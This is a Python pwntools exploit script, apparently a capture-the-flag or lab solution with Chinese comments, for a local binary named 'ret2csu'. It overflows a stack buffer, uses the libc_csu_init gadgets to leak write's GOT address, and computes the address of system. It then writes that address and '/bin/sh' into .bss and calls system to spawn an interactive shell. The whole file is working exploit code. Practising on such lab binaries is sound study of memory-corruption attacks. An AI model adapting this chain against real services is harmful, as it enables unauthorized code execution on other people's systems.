from pwn import *

# context.log_level = "debug"
gdb.context.terminal=["konsole","-e"] # manjaro kde


p = process("./ret2csu")
elf = ELF("./ret2csu")
libc = ELF("./libc.so.6")
# gdb.attach(p)

write_got = elf.got["write"] # 获取got表中write地址
main = elf.sym['main'] # main 函数地址


pop_6r_ret = 0x4011ea # pop rbx rbp r12 r13 r14 r15 ret

# mov r14 rdx ;mov r13 rsi;mov r12d edi;
# edi = r12 ;rsi=r13 ;rdx = r14
mov = 0x4011d0
# write(1,write.got,8) 必须输出8个字节 因为是x86-64 指令集都是64bits x86的话输出4 bytes 就行了
# edi = 1 rsi = write.got,rdx = 8
offset = 136

########################  leak libc
payload = b'a'*offset

payload += p64(pop_6r_ret)+p64(0)+p64(1)+p64(1)+p64(write_got)+p64(8)+p64(write_got)+p64(mov)
# 56 对应 6次pop stack和一次 add sp 8;
payload += b'a'*56 + p64(main) # 覆盖返回地址为main 方便下一次rop

p.recvuntil(b"World\n")
p.sendline(payload)

write_address = u64(p.recv(8)) # 8 bytes

system_address = write_address + (libc.symbols['system']-libc.symbols['write']) # system addresss


p.success("system address = {}".format(hex(system_address)))


#################### 写bss段

bss_add = 0x404038
# read(0,bss_add,16) rdi = r12 = 0,rsi = r13 = bss_add rdx = r14 = 16 rbx = 0 rbp = 1 r15 = read_got
read_got = elf.got['read']

payload2 = b'a'*offset
payload2 += p64(pop_6r_ret)+p64(0)+p64(1)+p64(0)+p64(bss_add)+p64(16)+p64(read_got)+p64(mov)
payload2 += b'b'*56 + p64(main)

#
p.recvuntil(b"World\n")
p.sendline(payload2)

p.send(p64(system_address)+b"/bin/sh\x00")
# p.sendline(b"/bin/sh\x00")

################### 执行 system
# system('/bin/sh') rdi = r12 = bss_add + 8

payload3 = b'a'*offset

payload3 += p64(pop_6r_ret)+p64(0)+p64(1)+p64(bss_add+8)+p64(0)+p64(0)+p64(bss_add)+p64(mov)
# payload3 += b'c'*56+p64(main)

p.recvuntil(b"World\n")
p.sendline(payload3)

p.interactive()





